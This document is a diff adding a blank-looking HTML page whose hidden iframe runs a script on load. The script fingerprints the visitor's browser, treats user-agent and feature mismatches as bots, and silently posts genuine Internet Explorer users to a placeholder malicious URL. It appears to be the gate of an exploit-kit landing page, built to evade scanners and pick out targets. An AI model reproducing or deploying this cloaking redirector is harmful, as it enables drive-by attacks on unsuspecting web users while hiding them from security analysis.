@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+   <title></title>
+   <meta charset="UTF-8">
+   <meta http-equiv="X-UA-Compatible" content="IE=EDGE">
+   <meta name="apple-mobile-web-app-capable" content="yes">
+   <meta name="apple-mobile-web-app-status-bar-style" content="black">
+   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body>
+<iframe onload="window.setTimeout('start()', 88)" src="about:blank" style="visibility:hidden"></iframe> 
+<script>
+var NormalURL = 'OMITTED EVIL URL';
+var InfoStr = '';
+function getBrowser() {
+   var ua = navigator.userAgent;
+   
+   var browsrObj = {
+           browser: 'unknown',
+           browser_real: '',
+           is_bot: false,
+           browser_quality: 0,
+           platform: 'desktop',
+           versionFull: '',
+           versionShort: ''
+       };
+       
+   try{
+   
+   var bName = function () {
+       if (ua.search(/Edge/) > -1) return "edge";
+       if ((ua.search(/MSIE/) > -1) || (ua./**/search(/Trident/) > -1)) return "ie";
+       if (ua.search(/Firefox/) > -1) return "firefox";
+       if ((ua.search(/Opera/) > -1) || (ua.search(/OPR/) > -1)) return "opera";
+       if (ua.search(/YaBrowser/) > -1) return "yabrowser";
+       if (ua.search(/Chrome/) > -1) return "chrome";
+       if (ua.search(/Safari/) > -1) return "safari";
+       if (ua.search(/Maxthon/) > -1) return "maxthon";
+       else return "unknown";
+   }();
+   browsrObj.browser = bName;
+   
+   if(/iphone|ipad|ipod|android|blackberry|mini|windows\sce|palm/i.test(navigator.userAgent.toLowerCase())) browsrObj.platform = 'mobile';
+   var version;
+   if(bName != 'unknown')
+   {
+       switch (bName) {
+           case "edge":
+               version = (ua.split("Edge")[1]).split("/")[1];
+               break;
+           case "ie":
+               if((ua.search(/Trident/) > -1))
+               {
+                   version = (ua.split("; rv:")[1]).split(")")[0];
+               }
+               else
+               {
+                   version = (ua.split("MSIE ")[1]).split(";")[0];
+               }
+               break;
+           case "firefox":
+               version = ua.split("Firefox/")[1];
+               break;
+           case "opera":
+               version = ua.split("Version/")[1];
+               break;
+           case "operaWebkit":
+               bName = "opera";
+               version = ua.split("OPR/")[1];
+               break;
+           case "yabrowser":
+               version = (ua.split("YaBrowser/")[1]).split(" ")[0];
+               break;
+           case "chrome":
+               version = (ua.split("Chrome/")[1]).split(" ")[0];
+               break;
+           case "safari":
+               version = (ua.split("Version/")[1]).split(" ")[0];
+               break;
+           case "maxthon":
+               version = ua.split("Maxthon/")[1];
+               break;
+           
+       }
+       browsrObj.versionFull = version;
+       browsrObj.versionShort = version.split(".")[0];
+   }
+   
+   } catch (err) {}
+   var w=window,d=document;
+   var CorrectBrowser = true;
+   var uaBrowser = browsrObj;
+   var isIE = isChrome = isFirefox = isOpera = 0;
+   
+   if(uaBrowser.platform != 'mobile' && (browsrObj.browser == 'ie' || browsrObj.browser == 'chrome' || browsrObj.browser == 'firefox')) {
+       if('ActiveXObject' in window) isIE++;
+       if('chrome' in window) isChrome++;                
+       if('opera' in window) isOpera++;
+       if('getBoxObjectFor' in d || 'mozInnerScreenX' in w) isFirefox++;
+       if('WebKitCSSMatrix' in w||'WebKitPoint' in w||'webkitStorageInfo' in w||'webkitURL' in w) isChrome++;
+       var f=0;
+       f|='sandbox' in d.createElement('iframe')?1:0;
+       f|='WebSocket' in w?2:0;
+       f|=w.Worker?4:0;
+       f|=w.applicationCache?8:0;
+       f|=w.history && history.pushState?16:0;
+       f|=d.documentElement.webkitRequestFullScreen?32:0;
+       f|='FileReader' in w?64:0;
+       
+       if(f==0) isIE++;
+       
+       if(isIE > 0) {
+           browsrObj.browser_real = 'ie';
+           browsrObj.browser_quality = isIE;
+       }
+       if(isChrome > 1 && isFirefox == 0) {
+           browsrObj.browser_real = 'chrome';
+           browsrObj.browser_quality = isChrome;
+       }
+       if(isFirefox > 0 && isChrome == 0) {
+           browsrObj.browser_real = 'firefox';
+           browsrObj.browser_quality = isFirefox;
+       }
+               
+       if(uaBrowser.browser != uaBrowser.browser_real) browsrObj.is_bot = true;
+   }
+   
+   InfoStr += browsrObj.browser+'-'+browsrObj.browser_real+'_ie'+isIE+'chrome'+isChrome+'firefox'+isFirefox;
+   
+   return browsrObj;
+}
+function start() {
+	BrowserInfo = getBrowser();
+	if(BrowserInfo.is_bot == true) {
+		document.write('');		
+			} else {
+      if(BrowserInfo.browser_real=='ie') {
+		    window.frames[0].document.body.innerHTML = '<form target="_parent" method="post" action="'+NormalURL+'"></form>'; 
+		    window.frames[0].document.forms[0].submit();
+      }
+	}
+	
+}
+</script>
